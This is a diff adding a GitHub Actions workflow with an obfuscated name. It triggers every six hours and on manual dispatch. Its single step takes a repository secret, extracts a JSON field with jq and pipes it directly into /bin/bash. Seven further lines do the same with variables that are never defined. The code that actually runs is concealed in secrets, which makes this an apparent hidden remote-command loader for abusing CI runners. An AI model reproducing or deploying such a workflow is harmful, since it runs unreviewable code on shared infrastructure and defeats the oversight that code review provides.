@@ -1,0 +1,25 @@
+name: zhouyiri2245
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhouyiri2245
+        env:
+          m54: ${{ secrets.m54 }}
+        run: |
+          echo $m54 | jq -r .nr29738 | /bin/bash
+          echo $p4 | jq -r .jvtto560 | /bin/bash
+          echo $yg34 | jq -r .ig5 | /bin/bash
+          echo $h218 | jq -r .giqz315 | /bin/bash
+          echo $xno055 | jq -r .purtx322 | /bin/bash
+          echo $az237 | jq -r .b6 | /bin/bash
+          echo $txol61501 | jq -r .bcrw15 | /bin/bash
+          echo $bkt66300 | jq -r .jjr2 | /bin/bash
+
